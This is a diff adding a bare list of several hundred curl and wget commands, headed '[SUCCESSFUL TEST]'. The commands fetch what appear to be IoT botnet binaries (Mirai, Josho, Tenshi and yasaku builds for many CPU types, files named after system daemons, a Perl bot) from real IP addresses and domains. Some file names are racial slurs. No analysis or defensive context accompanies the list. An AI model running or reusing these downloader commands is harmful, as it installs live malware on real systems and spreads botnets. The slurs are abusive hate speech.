@@ -1,0 +1,437 @@
+[SUCCESSFUL TEST] 
+curl -O http://104.236.54.99/fyfa.pcc
+curl -O http://159.203.69.152/INSANEMEME
+curl -O http://159.203.69.152/YallRJews
+curl -O http://159.203.69.152/HarmlessNET
+curl -O http://159.203.69.152/mcdonaldsW1FI
+curl -O http://159.203.69.152/H4RMl3SS
+curl -O http://104.236.54.99/fyfa.mpsl
+curl -O http://167.99.146.93/AB4g5/Josho.mips
+curl -O http://104.236.54.99/fyfa.mips
+curl -O http://104.236.54.99/fyfa.sh4
+curl -O http://159.203.69.152/YjDIEW
+curl -O http://167.99.146.93/AB4g5/Josho.arm6
+curl -O http://104.236.54.99/fyfa.arm
+curl -O http://167.99.146.93/AB4g5/Josho.arm4
+curl -O http://104.236.54.99/fyfa.spc
+curl -O http://167.99.146.93/AB4g5/Josho.ppc
+curl -O http://159.203.69.152/iJustNutted
+curl -O http://159.203.69.152/JfUE
+curl -O http://159.203.69.152/HIGHSOCIETY
+curl -O http://167.99.178.26/AB4g5/Josho.ppc
+curl -O http://159.203.69.152/PARAZITE
+curl -O http://167.99.146.93/AB4g5/Josho.sh4
+curl -O http://159.203.69.152/Jackkintoasock
+curl -O http://167.99.178.26/AB4g5/Josho.arm6
+curl -O http://159.203.69.152/WEEDISGR8
+curl -O http://167.99.178.26/AB4g5/Josho.sh4
+curl -O http://167.99.178.26/AB4g5/Josho.x86
+curl -O http://167.99.178.26/AB4g5/Josho.mips
+curl -O http://167.99.178.26/AB4g5/Josho.arm4
+curl -O http://167.99.178.26/AB4g5/Josho.arm7
+curl -O http://167.99.146.93/AB4g5/Josho.mpsl
+curl -O http://104.236.54.99/fyfa.m68k
+curl -O http://167.99.146.93/AB4g5/Josho.arm5
+curl -O http://104.236.54.99/fyfa.i686
+curl -O http://167.99.178.26/AB4g5/Josho.mpsl
+curl -O http://104.236.54.99/fyfa.x86
+curl -O http://167.99.146.93/AB4g5/Josho.x86
+curl -O http://104.236.54.99/fyfa.i586
+curl -O http://167.99.146.93/AB4g5/Josho.arm7
+curl -O http://163.172.99.61/bash
+curl -O http://163.172.99.61/pftp
+curl -O http://163.172.99.61/ntpd
+curl -O http://163.172.99.61/nut
+curl -O http://163.172.99.61/sh
+curl -O http://163.172.99.61/cron
+curl -O http://163.172.99.61/telnetd
+curl -O http://163.172.99.61/openssh
+curl -O http://167.99.178.26/AB4g5/Josho.arm5
+curl -O http://163.172.99.61/wget
+curl -O http://167.99.146.93/AB4g5/Josho.m68k
+curl -O http://163.172.99.61/sshd
+curl -O http://167.99.178.26/AB4g5/Josho.m68k
+curl -O http://185.172.164.40/bins/yasaku.arm5
+curl -O http://163.172.99.61/ftp
+curl -O http://163.172.99.61/apache2
+curl -O http://185.172.164.40/bins/yasaku.arm4
+curl -O http://185.244.25.153/bins/x86_64
+curl -O http://185.140.120.48/Nigger
+curl -O http://185.140.120.48/Nigger9
+curl -O http://163.172.99.61/tftp
+curl -O http://185.140.120.48/Nigger3
+curl -O http://185.244.25.153/bins/mips
+curl -O http://185.244.25.153/bins/i486
+curl -O http://185.244.25.153/bins/arm7
+curl -O http://185.244.25.153/bins/arm4
+curl -O http://185.140.120.48/Nigger7
+curl -O http://185.140.120.48/Nigger6
+curl -O http://185.140.120.48/Nigger5
+curl -O http://185.140.120.48/Nigger4
+curl -O http://159.203.69.152/capNIGGRz
+curl -O http://185.244.25.153/bins/sh4
+curl -O http://185.80.128.250/cron
+curl -O http://185.158.115.99/fyfa.spc
+curl -O http://195.181.214.183/telnetd
+curl -O http://23.88.113.93/ntpd
+curl -O http://185.172.164.40/bins/yasaku.arm7
+curl -O http://195.181.214.183/bash
+curl -O http://23.88.113.93/pftp
+curl -O http://185.158.115.99/fyfa.pcc
+curl -O http://195.181.214.183/openssh
+curl -O http://185.172.164.40/bins/yasaku.arm6
+curl -O http://185.158.115.99/fyfa.m68k
+curl -O http://23.88.113.93/sh
+curl -O http://185.158.115.99/fyfa.i586
+curl -O http://195.181.214.183/cron
+curl -O http://185.158.115.99/fyfa.x86
+curl -O http://195.181.214.183/ntpd
+curl -O http://195.181.214.183/pftp
+curl -O http://185.172.164.40/bins/yasaku.ppc
+curl -O http://185.140.120.48/Nigger8
+curl -O http://185.158.115.99/fyfa.i686
+curl -O http://185.172.164.40/bins/yasaku.mpsl
+curl -O http://195.181.214.183/nut
+curl -O http://185.140.120.48/Nigger10
+curl -O http://185.244.25.153/bins/i686
+curl -O http://185.244.25.153/bins/mpsl
+curl -O http://185.244.25.153/bins/arm5
+curl -O http://185.140.120.48/Nigger2
+curl -O http://23.88.113.93/tftp
+curl -O http://185.244.25.153/bins/m68k
+curl -O http://185.172.164.40/bins/yasaku.mips
+curl http://185.165.29.26/prefixppc -o prefixppc
+curl -O http://185.80.128.250/apache2
+curl -O http://23.88.113.93/cron
+curl -O http://185.80.128.250/sh
+curl -O http://185.80.128.250/wget
+curl -O http://46.166.185.32/ftp
+curl http://185.165.29.26/prefixarm4 -o prefixarm4
+curl -O http://195.181.214.183/wget
+curl -O http://46.166.185.32/wget
+curl -O http://185.244.25.153/bins/arm6
+curl -O http://195.181.214.183/ftp
+curl -O http://46.166.185.32/openssh
+curl -O http://195.181.214.183/sshd
+curl -O http://46.166.185.32/bash
+curl -O http://185.158.115.99/fyfa.sh4
+curl -O http://195.181.214.183/tftp
+curl -O http://195.181.214.183/sh
+curl -O http://195.181.214.183/apache2
+curl -O http://185.244.25.153/bins/arm
+curl -O http://185.244.25.153/bins/ppc
+curl -O http://185.80.128.250/pftp
+curl -O http://51.15.45.206/armextelnetd
+curl -O http://185.244.25.153/bins/spc
+curl -O http://46.166.185.32/tftp
+curl -O http://193.70.95.118/privsshd1
+curl -O http://185.140.120.48/Nigger1
+curl -O http://51.15.45.206/armexcron
+curl -O http://51.15.45.206/armexwget
+curl -O http://23.88.113.93/bash
+curl -O http://46.166.185.32/nut
+curl -O http://185.172.164.40/bins/yasaku.sh4
+curl -O http://185.80.128.250/ntpd
+curl -O http://46.166.185.32/sshd
+curl -O http://185.172.164.40/bins/yasaku.x86
+curl -O http://185.158.115.99/fyfa.arm
+curl -O http://51.15.45.206/armexopenssh
+curl -O http://23.88.113.93/wget
+curl -O http://23.88.113.93/sshd
+curl -O http://185.244.25.153/bins/x86
+curl -O http://23.88.113.93/telnetd
+curl -O http://185.158.115.99/fyfa.mpsl
+curl -O http://46.166.185.32/ntpd
+curl -O http://185.244.25.153/bins/ppc440fp
+curl -O http://46.166.185.32/telnetd
+curl -O http://23.88.113.93/ftp
+curl -O http://51.15.45.206/armexbash
+curl -O http://193.70.95.118/privntpd1
+curl -O http://185.80.128.250/openssh
+curl -O http://185.80.128.250/nut
+curl -O http://51.15.45.206/armextftp
+curl -O http://23.88.113.93/openssh
+curl -O http://185.80.128.250/telnetd
+curl -O http://51.15.45.206/armexpftp
+curl -O http://46.166.185.32/cron
+curl -O http://51.15.45.206/armexsshd
+curl -O http://51.15.45.206/armexapache2
+curl -O http://23.88.113.93/apache2
+curl -O http://51.15.45.206/armexftp
+curl -O http://185.172.164.40/bins/yasaku.m68k
+curl -O http://185.80.128.250/ftp
+curl -O http://185.158.115.99/fyfa.mips
+curl -O http://23.88.113.93/nut
+curl http://185.165.29.26/prefixmipsel -o prefixmipsel
+curl -O http://46.166.185.32/apache2
+curl -O http://46.166.185.32/sh
+curl -O http://51.15.45.206/armexntpd
+curl -O http://51.15.45.206/armexsh
+curl -O http://51.15.45.206/armexnut
+curl -O http://185.80.128.250/sshd
+curl http://185.165.29.26/prefixarm5 -o prefixarm5
+curl -O http://46.166.185.32/pftp
+curl -O http://185.244.25.153/bins/mips64
+curl -O http://185.80.128.250/bash
+curl -O http://185.80.128.250/tftp
+curl http://185.165.29.26/prefixsparc -o prefixsparc
+curl -O http://130.185.250.195/bash
+curl -O http://130.185.250.195/tftp
+curl -O http://130.185.250.195/openssh
+curl http://185.165.29.26/prefixarmv61 -o prefixarmv61
+curl -O https://gist.githubusercontent.com/PajeBR/3a210b3840858c0e93e29a82bc8780fc/raw/f9cf87893d3e265b41bf1a76f7b06a0e165dd76e/bot.pl
+curl -O http://130.185.250.195/telnetd
+curl -O http://130.185.250.195/sh
+curl -O http://130.185.250.195/apache2
+curl -O http://130.185.250.195/sshd
+curl -O http://130.185.250.195/ftp
+curl -O http://130.185.250.195/pftp
+curl -O http://130.185.250.195/wget
+curl http://185.165.29.26/prefixmips -o prefixmips
+curl http://185.165.29.26/prefixm68 -o prefixm68
+curl http://185.165.29.26/prefix86_64 -o prefix86_64
+curl http://185.165.29.26/prefixsh4 -o prefixsh4
+wget http://104.168.170.196/openssh
+curl http://185.165.29.26/prefixi686 -o prefixi686
+wget http://104.168.170.196/bash
+wget http://104.168.170.196/apache2
+curl http://185.165.29.26/prefixi586 -o prefixi586
+curl -O http://130.185.250.195/nut
+wget http://104.168.170.196/cron
+wget http://104.168.170.196/ftp
+wget http://104.168.170.196/sh
+wget http://104.168.170.196/ntpd
+wget http://104.168.170.196/sshd
+wget http://128.199.61.58/apache2
+curl -O http://130.185.250.195/ntpd
+curl -O http://130.185.250.195/cron
+wget http://104.168.170.196/tftp
+wget http://104.168.170.196/wget
+wget http://163.172.18.61/bash
+wget http://163.172.18.61/apache2
+wget http://163.172.18.61/ntpd
+wget http://163.172.18.61/ftp
+wget http://163.172.18.61/cron
+wget http://163.172.18.61/openssh
+wget http://163.172.18.61/telnetd
+wget http://163.172.18.61/sshd
+wget http://163.172.18.61/'lol'
+wget http://163.172.18.61/pftp
+wget http://163.172.18.61/tftp
+wget http://163.172.18.61/wget
+wget http://163.172.18.61/sh
+wget http://104.168.170.196/pftp
+wget http://165.227.60.32/bash
+wget http://165.227.60.32/cron
+wget http://165.227.60.32/ftp
+wget http://165.227.60.32/sh
+wget http://165.227.60.32/apache2
+wget http://165.227.60.32/ntpd
+wget http://185.80.128.250/cron
+wget http://130.185.250.195/ftp
+wget http://130.185.250.195/bash
+wget http://130.185.250.195/ntpd
+wget http://130.185.250.195/cron
+wget http://130.185.250.195/pftp
+wget http://130.185.250.195/sh
+wget http://130.185.250.195/apache2
+wget http://198.167.143.105/apache2
+wget http://198.167.143.105/ntpd
+wget http://130.185.250.195/tftp
+wget http://198.167.143.105/cron
+wget http://198.167.143.105/openssh
+wget http://130.185.250.195/nut
+wget http://198.167.143.105/pftp
+wget http://198.167.143.105/[cpu]
+wget http://198.167.143.105/bash
+wget http://198.167.143.105/ftp
+wget http://130.185.250.195/sshd
+wget http://198.167.143.105/sshd
+wget http://198.167.143.105/wget
+wget http://198.167.143.105/telnetd
+wget http://198.167.143.105/tftp
+wget http://198.167.143.105/sh
+wget http://130.185.250.195/telnetd
+wget http://130.185.250.195/openssh
+wget http://165.227.60.32/pftp
+wget http://130.185.250.195/wget
+wget http://165.227.60.32/tftp
+wget http://165.227.60.32/sshd
+wget http://165.227.60.32/wget
+wget http://165.227.60.32/openssh
+wget http://185.165.29.25/as
+wget http://185.165.29.25/sddf
+wget http://195.181.214.183/apache2
+wget http://185.165.29.25/fg
+wget http://195.181.214.183/bash
+wget http://185.165.29.25/ty
+wget http://195.181.214.183/nut
+wget http://195.181.214.183/ntpd
+wget http://195.181.214.183/wget
+wget http://195.181.214.183/openssh
+wget http://195.181.214.183/sh
+wget http://195.181.214.183/ftp
+wget http://165.227.60.32/telnetd
+wget http://195.181.214.183/telnetd
+wget http://195.181.214.183/tftp
+wget http://195.181.214.183/cron
+wget http://195.181.214.183/pftp
+wget http://195.181.214.183/sshd
+wget http://185.165.29.26/prefixmipsel
+wget http://185.165.29.26/prefixarm4
+wget http://185.165.29.25/ew
+wget http://185.165.29.26/prefixsparc
+wget http://185.165.29.39/apache2
+wget http://185.165.29.39/as
+wget http://217.23.4.22/bins/Tenshi.sh4
+wget http://185.165.29.25/ftr
+wget http://217.23.4.22/bins/Tenshi.arm4
+wget http://217.23.4.22/bins/Tenshi.arm
+wget http://217.23.4.22/bins/Tenshi.arm6
+wget http://217.23.4.22/bins/Tenshi.arm5
+wget http://217.23.4.22/bins/Tenshi.mips
+wget http://217.23.4.22/bins/Tenshi.x86
+wget http://185.165.29.25/aw
+wget http://217.23.4.22/bins/Tenshi.ppc
+wget http://217.23.4.22/bins/Tenshi.mpsl
+wget http://185.165.29.26/prefixarm5
+wget http://185.165.29.25/er
+wget http://185.165.29.25/ke
+wget http://185.165.29.26/prefixi686
+wget http://185.165.29.26/prefixm68
+wget http://185.165.29.39/wget
+wget http://185.165.29.26/prefix86_64
+wget http://185.165.29.25/ebs
+wget http://185.165.29.26/prefixarmv61
+wget http://185.165.29.39/aw
+wget http://185.165.29.25/re
+wget http://185.165.29.26/prefixppc
+wget http://185.165.29.25/tel
+wget http://185.165.29.26/prefixi586
+wget http://185.165.29.39/'[CPU]'
+wget http://185.165.29.39/er
+wget http://185.165.29.39/fg
+wget http://185.165.29.39/cron
+wget http://185.165.29.39/bash
+wget http://185.165.29.26/prefixsh4
+wget http://185.165.29.39/ftp
+wget http://185.165.29.25/mba
+wget http://185.165.29.39/mba
+wget http://185.165.29.26/prefixmips
+wget http://185.165.29.39/pftp
+wget http://144.217.153.18/w13
+wget http://185.165.29.39/ke
+wget http://185.165.29.39/openssh
+wget http://185.165.29.39/ty
+wget http://185.165.29.39/re
+wget http://185.165.29.39/telnetd
+wget http://185.165.29.39/ebs
+wget http://185.165.29.39/sh
+wget http://185.165.29.41/ftp
+wget http://185.165.29.39/ew
+wget http://185.165.29.41/apache2
+wget http://185.165.29.47/awwd
+wget http://185.165.29.39/ftr
+wget http://185.165.29.41/openssh
+wget http://185.165.29.39/ntpd
+wget http://185.165.29.41/cron
+wget http://185.165.29.41/sh
+wget http://185.165.29.47/cron
+wget http://185.165.29.41/'[CPU]'
+wget http://185.165.29.47/aw
+wget http://185.165.29.41/wget
+wget http://144.217.153.18/w4
+wget http://185.165.29.39/tel
+wget http://185.165.29.47/dsf
+wget http://185.165.29.47/23a
+wget http://185.165.29.41/pftp
+wget http://185.165.29.41/bash
+wget http://185.165.29.39/sddf
+wget http://185.165.29.39/sshd
+wget http://185.165.29.41/ntpd
+wget http://185.165.29.39/tftp
+wget http://144.217.153.18/w6
+wget http://144.217.153.18/w8
+wget http://144.217.153.18/w7
+wget http://144.217.153.18/w9
+wget http://144.217.153.18/w3
+wget http://144.217.153.18/w5
+wget http://144.217.153.18/w2
+wget http://185.165.29.47/as
+wget http://185.165.29.41/tftp
+wget http://185.165.29.41/sshd
+wget http://144.217.153.18/w12
+wget http://185.165.29.41/telnetd
+wget http://144.217.153.18/w1
+wget http://144.217.153.18/w10
+wget http://185.165.29.47/telnetd
+wget http://185.165.29.47/tel
+wget http://185.165.29.47/[CPU]
+wget http://185.165.29.47/ftr
+wget http://185.165.29.47/er
+wget http://185.165.29.47/'[CPU]'
+wget http://185.165.29.47/apache2
+wget http://185.165.29.47/bash
+wget http://185.165.29.47/fgd
+wget http://185.165.29.47/ew
+wget http://185.165.29.47/openssh
+wget http://185.165.29.47/tftp
+wget http://185.165.29.47/ebs
+wget http://185.165.29.47/ftp
+wget http://185.165.29.47/hjg
+wget http://185.165.29.47/gtdf
+wget http://185.165.29.47/sees
+wget http://185.165.29.47/mba
+wget http://185.165.29.47/re
+wget http://185.165.29.47/weas
+wget http://185.165.29.47/hfbb
+wget http://185.165.29.47/sddf
+wget http://185.165.29.47/bae
+wget http://185.165.29.47/ke
+wget http://185.165.29.47/ntpd
+wget http://185.165.29.47/wget
+wget http://185.165.29.47/sh
+wget http://185.165.29.47/sda
+wget http://185.165.29.47/fg
+wget http://185.165.29.47/fdr
+wget http://185.165.29.47/ty
+wget http://185.165.29.47/pftp
+wget http://185.165.29.47/yuj
+wget http://185.165.29.47/sshd
+wget http://51.38.186.179/apache2
+wget http://51.38.186.179/bash
+wget http://51.38.186.179/ftp
+wget http://51.38.186.179/openssh
+wget http://51.38.186.179/cron
+wget http://51.38.186.179/pftp
+wget http://51.38.186.179/sh
+wget http://51.38.186.179/sshd
+wget http://51.38.186.179/tftp
+wget http://51.38.186.179/wget
+wget http://51.38.186.179/ntpd
+wget http://51.38.186.179/[cpu]
+wget http://kysfag.3x.ro/bins/mirai.x86 -O dvrHelper
+wget http://kysfag.3x.ro/bins/mirai.mips -O dvrHelper
+wget http://kysfag.3x.ro/bins/mirai.arm5n -O dvrHelper
+wget http://kysfag.3x.ro/bins/mirai.m68k -O dvrHelper
+wget http://kysfag.3x.ro/bins/mirai.arm7 -O dvrHelper
+wget http://kysfag.3x.ro/bins/mirai.mpsl -O dvrHelper
+wget http://kysfag.3x.ro/bins/mirai.sh4 -O dvrHelper
+wget http://kysfag.3x.ro/bins/mirai.ppc -O dvrHelper
+wget http://kysfag.3x.ro/bins/mirai.arm -O dvrHelper
+wget http://kysfag.3x.ro/bins/mirai.spc -O dvrHelper
+wget http://phreaker56.wap.sh/vpsmanager/squid.txt -O /tmp/sqd3
+wget http://phreaker56.wap.sh/vpsmanager/squid2.txt -O /tmp/sqd3
+wget http://80.211.235.153/openssh
+wget http://80.211.235.153/sshd
+wget http://80.211.235.153/telnetd
+wget http://80.211.235.153/tftp
+wget http://80.211.235.153/[cpu]
+wget http://80.211.235.153/wget
+wget http://80.211.235.153/apache2
+wget http://80.211.235.153/pftp
+wget http://80.211.235.153/cron
+wget http://80.211.235.153/sh
+wget http://80.211.235.153/ntpd
+wget http://80.211.235.153/ftp
+wget http://80.211.235.153/bash
